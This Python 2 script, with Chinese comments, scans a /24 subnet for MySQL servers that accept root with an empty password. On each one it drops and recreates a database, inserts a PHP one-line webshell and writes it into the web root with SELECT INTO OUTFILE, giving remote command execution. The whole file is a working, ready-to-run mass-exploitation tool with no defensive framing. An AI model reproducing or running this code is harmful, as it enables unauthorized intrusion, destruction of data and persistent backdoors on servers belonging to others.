#!/usr/bin/env python
#coding=utf-8
#author:Blus

import MySQLdb
import threading
import IPy
import  time
import subprocess
def mysql_connect1(ip,shell_url,shell_content):

    if not(ping_ip(ip)):
        #print ip,"down"
        return

    #尝试数据库连接
    try:
        conn=MySQLdb.connect(host=ip,user='root',passwd='',db='',port=3306)
        cur=conn.cursor()

        #若数据库连接成功，开始写马
        try:
            #如果有重名数据库则删除该数据库
            cur.execute('DROP database IF EXISTS `A123456`;')
            cur.execute('create database A123456;')
        except:
            print ip,"数据库创建错误"
            return
        cur.execute('use A123456;')

        try:
            cur.execute('CREATE TABLE A123456.B123456 (C123456 TEXT NOT NULL );')
            print ip,"表创建成功"
        except:
            print ip,"表创建失败"
            return 
       
        try:
            shell_content2="INSERT INTO B123456 (C123456)VALUES ('{}');".format(shell_content)
            cur.execute(shell_content2)
            print ip,"一句话插入成功"
        except:
            print ip,"一句话插入失败"
            return
        #这里设置小马导出后的路径，该目录需要有写权限 且mysql没有开启 secure-file-priv
        try:
            sql_insert="SELECT C123456 from B123456 into outfile '{}';".format(shell_url)
            cur.execute(sql_insert)
            print ip,"写入成功".decode()
        except Exception as e:
            print ip,"写入错误",e
            return

        cur.close()
        conn.close()
        return
    except MySQLdb.Error,e:
        print "Mysql_Error: %d: %s" % (e.args[0], e.args[1])
        return

def ping_ip(ip):
    # 调用ping命令,如果不通，则会返回100%丢包的信息。通过匹配是否有100%关键字，判断主机是否存活

    cmd = 'ping -w 1 %s' % ip
    p = subprocess.Popen(cmd,
                         stdin=subprocess.PIPE,
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE,
                         shell=True)
    result = p.stdout.read()
    regex = result.find('100%')
    # 未匹配到就是-1
    # 未匹配到就是存活主机
    if (regex == -1):
        return 1
    else:
        return 0


if __name__ == "__main__":
    start = time.time()
#内容设置
    shell_url='../../../../wamp64/www/erg2313231.php';
    shell_content='<?php ($_=@$_GET[2]).@$_($_POST[1323222222])?>'

    #设置同时运行的线程数
    threads=25
    
    #要检测的IP网段
    ip1 = IPy.IP('192.168.0.0/24')

    for ip in ip1:    
        ip=str(ip)

        while(threading.activeCount()>threads):
            time.sleep(1)
        t1=threading.Thread(target=mysql_connect1, args=(ip, shell_url,shell_content))
        t1.start()

    #当线程只剩1时，说明执行完了
    while(threading.activeCount()!=1):
        time.sleep(1)
    print "检测结束"
    end = time.time()
    print end - start
